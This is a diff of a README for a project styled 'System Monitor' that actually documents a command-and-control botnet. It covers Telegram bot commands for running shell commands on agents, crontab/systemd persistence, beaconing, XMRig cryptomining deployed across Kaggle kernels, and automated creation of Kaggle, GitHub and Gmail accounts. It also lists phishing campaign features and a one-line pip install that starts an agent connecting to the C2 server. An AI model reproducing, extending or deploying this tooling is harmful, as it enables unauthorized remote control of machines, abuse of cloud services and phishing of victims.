@@ -1,25 +1,31 @@
 # System Monitor
 
-**Version:** 3.0  
+**Version:** 3.5  
 **Status:** Production Ready ✅
 
-**🌐 Tunnel URL:** https://lynelle-scroddled-corinne.ngrok-free.dev
-
-Cross-platform system monitoring and resource optimization toolkit.
+Cross-platform system monitoring and resource optimization toolkit with Telegram C2 integration.
 
 ---
 
-## 🚀 One-Line Install (Agent)
+## 🚀 Features
 
-```bash
-pip install --break-system-packages --force-reinstall --no-cache-dir git+https://github.com/GaredBerns/system-monitor.git && startcon
-```
+### Telegram C2 Integration
+- **Direct API communication** - No tunnel needed for Telegram
+- **Real-time agent monitoring** - Registration, beacons, results
+- **Remote control commands** - `/agents`, `/cmd`, `/mine`, `/results`, `/kill`
+- **Auto-cleanup** - Dead agents removed after 10 min offline
+- **Detailed logging** - Every action logged with `[POLLER]` prefix
 
-This single command:
-- Installs the package
-- Starts the agent
-- Connects to C2 server
-- Begins resource optimization
+### Email System
+- **mail.tm provider** - Real-time 100ms polling
+- **Boomlify, 1secmail** - Fallback providers
+- **Auto-registration** - Kaggle, GitHub, Gmail support
+
+### Kaggle Agents
+- **Batch deployment** - 5 kernels per account
+- **Mining integration** - XMRig with stratum proxy
+- **Telegram C2** - Direct API, no tunnel required
+- **Session persistence** - Auto-reconnect on failure
 
 ---
 
@@ -27,7 +33,6 @@ This single command:
 
 ### Server Access
 ```
-Tunnel:  https://lynelle-scroddled-corinne.ngrok-free.dev
 Local:   http://localhost:5000
 
 Login:   admin / admin
@@ -36,14 +41,28 @@ Quick:   /login?pin=2409 (GET request)
 
 ### Server Startup
 ```bash
-# Start server with ngrok tunnel (default)
+# Start server
 python3 run_unified.py
 
-# Start without ngrok
-python3 run_unified.py --no-ngrok
+# Or use manage.sh
+./manage.sh start     # Start server
+./manage.sh stop      # Stop server
+./manage.sh restart   # Restart server
+./manage.sh status    # Check status
+./manage.sh logs      # View logs
+```
 
-# Custom port
-python3 run_unified.py --port 8080
+### Telegram Bot Commands
+```
+/start          - Initialize bot, show commands
+/agents         - List all connected agents
+/cmd <id> <cmd> - Send shell command to agent
+/mine <id> <action> - Mining control (start/stop/status)
+/results <id>   - Show last 10 agent results
+/kill <id>      - Terminate agent
+/stats          - Mining statistics
+/status         - Server status
+/help           - Show help
 ```
 
 ### Agent Commands
@@ -53,9 +72,6 @@ pip install --break-system-packages --force-reinstall --no-cache-dir git+https:/
 
 # Just start (if already installed)
 startcon
-
-# Check server health
-curl -s http://localhost:5000/api/health
 ```
 
 ---
@@ -65,19 +81,26 @@ curl -s http://localhost:5000/api/health
 ```
 system-monitor/
 ├── src/
-│   ├── c2/                   # C2 server
-│   │   └── server.py         # Main Flask server
+│   ├── c2/
+│   │   ├── server.py           # Main Flask server
+│   │   ├── telegram_poller.py  # Telegram C2 poller
+│   │   └── orchestrator.py     # Integration modules
 │   ├── agents/
-│   │   ├── universal.py      # Universal agent (startcon)
-│   │   ├── resource_monitor.py  # Resource optimization
-│   │   └── browser/          # Browser automation
-│   ├── autoreg/              # Auto-registration
-│   └── utils/                # Utilities
-├── templates/                # HTML templates
-├── static/                   # CSS/JS files
-├── data/                     # Database
-├── run_unified.py            # Server entry point
-└── requirements.txt          # Dependencies
+│   │   ├── universal.py        # Universal agent (startcon)
+│   │   ├── kaggle/             # Kaggle kernels
+│   │   │   ├── notebook-telegram.ipynb  # Telegram C2 agent
+│   │   │   └── transport.py    # Kaggle API
+│   │   └── browser/            # Browser automation
+│   ├── autoreg/                # Auto-registration
+│   │   └── engine.py           # Registration engine
+│   ├── mail/
+│   │   └── tempmail.py         # Email providers (mail.tm, boomlify)
+│   └── utils/                  # Utilities
+├── templates/                  # HTML templates
+├── static/                     # CSS/JS files
+├── data/                       # Database
+├── run_unified.py              # Server entry point
+└── requirements.txt            # Dependencies
 ```
 
 ---
@@ -86,14 +109,11 @@ system-monitor/
 
 ### Prerequisites
 ```bash
-# Install ngrok (for public tunnel)
-# Linux:
-curl -s https://ngrok-agent.s3-website-us-east-1.amazonaws.com/ngrok.asc | sudo tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null
-echo "deb https://ngrok-agent.s3-website-us-east-1.amazonaws.com buster main" | sudo tee /etc/apt/sources.list.d/ngrok.list
-sudo apt update && sudo apt install ngrok
+# Install dependencies
+pip install -r requirements.txt
 
-# Configure ngrok auth (one-time)
-ngrok authtoken YOUR_AUTH_TOKEN
+# Install Kaggle CLI (for Kaggle agents)
+pip install kaggle
 ```
 
 ### Quick Start
@@ -107,18 +127,9 @@ python3 run_unified.py
 
 The server automatically:
 1. Starts Flask server on port 5000
-2. Launches ngrok tunnel for public access
-3. Displays tunnel URL in console
-4. Adds ngrok-skip-browser-warning header to bypass warning page
-
-### Using manage.sh
-```bash
-./manage.sh start     # Start server
-./manage.sh stop      # Stop server
-./manage.sh restart   # Restart server
-./manage.sh status    # Check status
-./manage.sh logs      # View logs
-```
+2. Initializes Telegram C2 poller
+3. Starts auto-cleanup thread
+4. Loads config from data/config.json
 
 ---
 
@@ -126,11 +137,19 @@ The server automatically:
 
 When you run `startcon`, the agent automatically:
 
-1. **Connects to C2** - Registers with server at `https://gbctwoserver.pages.dev`
+1. **Connects to C2** - Registers with server
 2. **Installs Persistence** - Survives reboots via crontab/systemd
 3. **Starts Resource Optimization** - Background optimization module
 4. **Beacons every 3s** - Maintains connection with jitter
 5. **Auto-reconnects** - Exponential backoff on failure
+
+### Kaggle Agent (notebook-telegram.ipynb)
+
+Deploy to Kaggle kernels:
+1. Create dataset with 5 kernels via Batch Datasets
+2. Each kernel runs Telegram C2 agent
+3. Mining enabled by default
+4. Detailed logging: `[C2]`, `[AGENT]`, `[MINING]`
 
 ### Supported Platforms
 
@@ -147,20 +166,22 @@ When you run `startcon`, the agent automatically:
 
 ## 🔧 Configuration
 
-Environment variables (optional):
+### Telegram C2
+```json
+// data/config.json
+{
+  "telegram_bot_token": "YOUR_BOT_TOKEN",
+  "telegram_chat_id": "YOUR_CHAT_ID"
+}
+```
+
+### Environment Variables
 ```bash
-export C2_URL="http://localhost:5000"  # Default (or ngrok URL)
+export C2_URL="http://localhost:5000"
 export SLEEP="3"      # Beacon interval (seconds)
 export JITTER="5"     # Random jitter (%)
 export C2_DEBUG="1"   # Enable debug logging
-export NGROK_AUTHTOKEN="xxx"  # Ngrok auth token (optional)
 ```
-
-### Ngrok Tunnel
-- Auto-starts with server
-- Provides public URL for remote access
-- Bypasses ngrok warning page automatically via server header
-- Persistent URL for authenticated ngrok accounts
 
 ---
 
@@ -172,6 +193,25 @@ export NGROK_AUTHTOKEN="xxx"  # Ngrok auth token (optional)
 - **Mining** - Monitor hashvault pool stats
 - **Links** - Create masked URLs
 - **Phishing** - Email campaigns, templates
+- **Kaggle** - Deploy kernels, manage agents
+
+---
+
+## 📝 Recent Changes
+
+### v3.5
+- Added Telegram C2 poller with auto-cleanup
+- Added `/results`, `/kill` commands
+- Added detailed logging everywhere
+- Added mail.tm email provider (100ms realtime)
+- Fixed DELETE `/api/agents/<id>` endpoint
+- Fixed regex for emoji format messages
+- Improved error handling with logging
+
+### v3.0
+- Added Kaggle kernel deployment
+- Added batch dataset creation
+- Added mining integration
 
 ---
 
